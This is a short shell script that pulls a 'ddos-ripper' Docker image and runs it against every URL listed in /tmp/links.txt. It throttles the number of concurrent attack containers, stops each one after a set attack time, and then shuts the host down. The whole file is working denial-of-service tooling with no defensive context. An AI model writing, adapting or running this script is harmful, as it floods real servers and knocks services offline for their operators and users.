sudo docker pull nitupkcuf/ddos-ripper:latest

if file /tmp/links.txt | grep CRLF; then
    echo "/tmp/links.txt contains CRLF. Converting file"
    sudo vim /tmp/links.txt -c "set ff=unix" -c ":wq"
fi

while read link; do
    while [ $(sudo docker ps | wc -l) -gt 4 ]; do
        sleep 60
    done
    sudo docker stop -t $1 $(sudo docker run -d --stop-signal 2 nitupkcuf/ddos-ripper:latest "$link") &
    sleep 5
done </tmp/links.txt
sleep $1 # waiting attack time after last links started, before server shutdown
sudo shutdown now
